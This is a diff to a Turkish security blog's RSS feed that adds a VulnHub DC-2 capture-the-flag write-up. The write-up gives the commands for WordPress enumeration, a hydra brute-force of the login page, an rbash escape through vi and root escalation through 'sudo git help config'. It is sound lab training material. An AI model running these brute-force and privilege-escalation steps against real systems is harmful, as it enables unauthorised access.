@@ -5,8 +5,220 @@
         <description>Recent content in Posts on Cyber Security Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>tr</language>
-        <lastBuildDate>Sat, 26 Sep 2020 15:05:32 +0300</lastBuildDate>
+        <lastBuildDate>Mon, 28 Sep 2020 14:55:50 +0300</lastBuildDate>
         <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>VULNHUB DC-2 Write Up</title>
+            <link>https://barcode91.github.io/posts/2020/09/vulnhub-dc-2-write-up/</link>
+            <pubDate>Mon, 28 Sep 2020 14:55:50 +0300</pubDate>
+            
+            <guid>https://barcode91.github.io/posts/2020/09/vulnhub-dc-2-write-up/</guid>
+            <description>Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan DC-2 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip; 😊
+1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
+netdiscover -i eth1  Nmap ile portlar ve portlarda çalışan servisler tespit edilir.
+sudo nmap -sV -sC -p- 192.168.56.109  192.168.56.109 dc-2 /etc/hosts dosyasına eklenir.</description>
+            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/dc-2,311/">VULNHUB</a> &lsquo;da yer alan DC-2 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip; 😊</p>
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
+</code></pre></div>
+    <img src="/images/vulnhub/dc2/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Nmap ile portlar ve portlarda çalışan servisler tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.109
+</code></pre></div>
+    <img src="/images/vulnhub/dc2/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><code>192.168.56.109   dc-2</code> <strong>/etc/hosts</strong> dosyasına eklenir. 80 portunda çalışan web servisine tarayıcından istek atılır. Wordpress uygulamasının çalıştığı görülmektedir.</p>
+
+    <img src="/images/vulnhub/dc2/webpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Site içerisinde yer alan flag sekmesine tıklanarak ilk flag elde edilir.</p>
+
+    <img src="/images/vulnhub/dc2/flag1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Rockyou wordlistinin bir işe yaramayacağı ile ilgili bir not bırakılmış gözüküyor. <strong>Cewl</strong> aracı kullanılarak web sitesinde yer alan metinlerden wordlist oluşturulur.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cewl -d <span style="color:#ae81ff">3</span> -m <span style="color:#ae81ff">5</span> http://dc-2/ -w Wordlist_dc_2.lst
+<span style="color:#75715e"># -d derinlik</span> 
+<span style="color:#75715e"># -m minumum kelime uzunluğu</span>
+</code></pre></div><p>Oluşturulan wordlistin bir kısmı aşağıdaki gibidir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">─[barcode@parrot]─[~]$ cat Wordlist_dc_2.lst 
+vitae
+luctus
+content
+Donec
+turpis
+Aenean
+tincidunt
+finibus
+dictum
+egestas
+volutpat
+...
+...
+</code></pre></div><p>Web dizin taraması gerçekleştilir. Wordpress dosyaları haricinde herhangi bir farklı dosya görülmemektedir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://dc-2/ -w /usr/share/wordlists/dirb/big.txt -x .php,.txt
+</code></pre></div><pre><code class="language-terminal" data-lang="terminal">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://dc-2/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php,txt
+[+] Timeout:        10s
+===============================================================
+2020/09/25 07:46:56 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.txt (Status: 403)
+/index.php (Status: 301)
+/license.txt (Status: 200)
+/server-status (Status: 403)
+/wp-admin (Status: 301)
+/wp-content (Status: 301)
+/wp-includes (Status: 301)
+/wp-config.php (Status: 200)
+/wp-login.php (Status: 200)
+/wp-trackback.php (Status: 200)
+===============================================================
+2020/09/25 07:47:09 Finished
+
+</code></pre><p>Wordpress için kullanılan wpscan aracı ile tarama gerçekleştirilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://dc-2/ --enumerate
+</code></pre></div><p>Tarama sonucunda 3 adet kullanıcı adı tespit edilir. Ayrıca wordpress sürümünün 4.7.10 olduğu görülmektedir.</p>
+
+    <img src="/images/vulnhub/dc2/wpscan.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Elde edilen kullanıcı adları ile user.txt adında bir wordlist oluşturulur. Daha sonra hydra aracı ile wordpress admin paneline brute-force saldırısı yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hydra -L user.txt -P ./Wordlist_dc_2.lst dc-2 -V http-form-post <span style="color:#e6db74">&#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</span>
+</code></pre></div>
+    <img src="/images/vulnhub/dc2/tom.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+
+    <img src="/images/vulnhub/dc2/jerry.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<p>Jerry kullanıcısı ile login olunur. Pages sekmesine tıklanır ve mevcut sayfalar listelenir.</p>
+
+    <img src="/images/vulnhub/dc2/pages.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Flag2 sayfasına tıklanır. <em><strong>(Wordpress 4.7.10 sürümünde gizli sayfaların görüntülenmesini sağlayan bir zafiyet bulunmaktadır. http://dc-2/?static=1&amp;order=asc)</strong></em></p>
+
+    <img src="/images/vulnhub/dc2/flag2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Daha sonra dosya media sekmesinden dosya upload edilemeye çalışıldığında kullanıcının buna yetkili olmadığı tespit edilir. 😣</p>
+
+    <img src="/images/vulnhub/dc2/notupload.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Elde edilen parola bilgileri ssh servisinde denenir ve tom kullanıcı için ssh bağlantısı sağlanır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -p <span style="color:#ae81ff">7744</span> tom@192.168.56.109
+</code></pre></div>
+    <img src="/images/vulnhub/dc2/ssh.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Terminal ekranında cd vb. birçok komut çalıştırılamamaktadır. Shell türüne bakıldığında rbash olduğu görülmektedir.</p>
+
+    <img src="/images/vulnhub/dc2/bash.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>İlk olarak çalıştırılabilir komutlar tespit edilir. Dizinde listeleme yapılır. Ayrıca <code>echo $PATH</code> komutu ile path dizini tespit edilir. <em><strong>/home/tom/usr/bin</strong></em> klasörü içerisinde tom kullanıcısın çalıştırabileceği komutlar yer almaktadır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tom@DC-2:~$ cd usr
+-rbash: cd: restricted
+
+tom@DC-2:~$ ls -lsa
+total <span style="color:#ae81ff">76</span>
+ <span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom  tom   <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">28</span> 07:19 .
+ <span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">4</span> root root  <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> ..
+ <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom   <span style="color:#ae81ff">1200</span> Sep <span style="color:#ae81ff">28</span> 07:38 .bash_history
+ <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bash_login
+ <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bash_logout
+ <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bash_profile
+ <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bashrc
+ <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">95</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> flag3.txt
+ <span style="color:#ae81ff">4</span> -rw------- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">79</span> Sep <span style="color:#ae81ff">28</span> 07:31 .lesshst
+ <span style="color:#ae81ff">4</span> -rwxr-x--- <span style="color:#ae81ff">1</span> tom  tom     <span style="color:#ae81ff">30</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .profile
+<span style="color:#ae81ff">12</span> -rw------- <span style="color:#ae81ff">1</span> tom  tom  <span style="color:#ae81ff">12288</span> Sep <span style="color:#ae81ff">27</span> 13:32 .swo
+<span style="color:#ae81ff">12</span> -rw------- <span style="color:#ae81ff">1</span> tom  tom  <span style="color:#ae81ff">12288</span> Sep <span style="color:#ae81ff">27</span> 13:13 .swp
+ <span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom  tom   <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> usr
+
+tom@DC-2:~$ ls -lsa usr
+total <span style="color:#ae81ff">12</span>
+<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom tom <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .
+<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom tom <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">28</span> 07:19 ..
+<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">2</span> tom tom <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> bin
+
+tom@DC-2:~$ ls -lsa usr/bin
+total <span style="color:#ae81ff">8</span>
+<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">2</span> tom tom <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .
+<span style="color:#ae81ff">4</span> drwxr-x--- <span style="color:#ae81ff">3</span> tom tom <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> ..
+<span style="color:#ae81ff">0</span> lrwxrwxrwx <span style="color:#ae81ff">1</span> tom tom   <span style="color:#ae81ff">13</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> less -&gt; /usr/bin/less
+<span style="color:#ae81ff">0</span> lrwxrwxrwx <span style="color:#ae81ff">1</span> tom tom    <span style="color:#ae81ff">7</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> ls -&gt; /bin/ls
+<span style="color:#ae81ff">0</span> lrwxrwxrwx <span style="color:#ae81ff">1</span> tom tom   <span style="color:#ae81ff">12</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> scp -&gt; /usr/bin/scp
+<span style="color:#ae81ff">0</span> lrwxrwxrwx <span style="color:#ae81ff">1</span> tom tom   <span style="color:#ae81ff">11</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> vi -&gt; /usr/bin/vi
+</code></pre></div><p>Vi uygulaması içerisinden bash set edilerek shell değiştirilebilmektedir. Vi uygulaması açılır. Aşağıda yer alan komutlar sıra ile girilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">:set shell=/bin/bash
+:shell
+</code></pre></div><p>işlem sonunda bash kabuğuna geçilir.  PATH değişkeni /bin ve /usr/bin olacak şekilde ayarlanır.</p>
+
+    <img src="/images/vulnhub/dc2/path.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Daha sonra tom kullanıcısının home dizininde yer alan flag3.txt okunur.</p>
+
+    <img src="/images/vulnhub/dc2/flag3.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Jerry kullanıcısının home dizininde yer alan flag4.txt okunur.</p>
+
+    <img src="/images/vulnhub/dc2/flag4.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p>Sudo -l komutu ile <strong>Tom</strong> kullanıcısının yetkileri kontrol edildiğinde sudo grubuna üye olmadığı/sudoers dosyasında bulunmadığı tespit edilir. Jerry kullacısına <code>su jerry</code> ile geçiş yapılır. Parola bilgisi olarak wordpress panel giriş şifresi denendiğinde başarılı olunur. 😎</p>
+<p>Jerry kullanıcısı için sudo yetkileri kontrol edildiğinde, git uygulamasını parola girmeden root yetkisi ile çalıştırabildiği görülmektedir.</p>
+
+    <img src="/images/vulnhub/dc2/git.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Git uygulaması sudo yetkisi ile çalıştırılır ve aşağıda yeralan komutlar girilerek yüksek yetkili bash kabuğuna geçilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo git help config
+!/bin/bash
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@DC-2:/# cd /root
+root@DC-2:~# ls -lsa
+total <span style="color:#ae81ff">32</span>
+<span style="color:#ae81ff">4</span> drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .
+<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">21</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2019</span> ..
+<span style="color:#ae81ff">4</span> -rw-------  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">207</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .bash_history
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">570</span> Jan <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2010</span> .bashrc
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">427</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> final-flag.txt
+<span style="color:#ae81ff">4</span> -rw-------  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">46</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .lesshst
+<span style="color:#ae81ff">4</span> -rw-------  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">232</span> Mar <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .mysql_history
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">140</span> Nov <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2007</span> .profile
+</code></pre></div><p>final-flag.txt değeri okunarak çözüm işlemi tamalanır.</p>
+
+    <img src="/images/vulnhub/dc2/finalflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+]]></content>
+        </item>
         
         <item>
             <title>VULNHUB DC-1 Write Up</title>
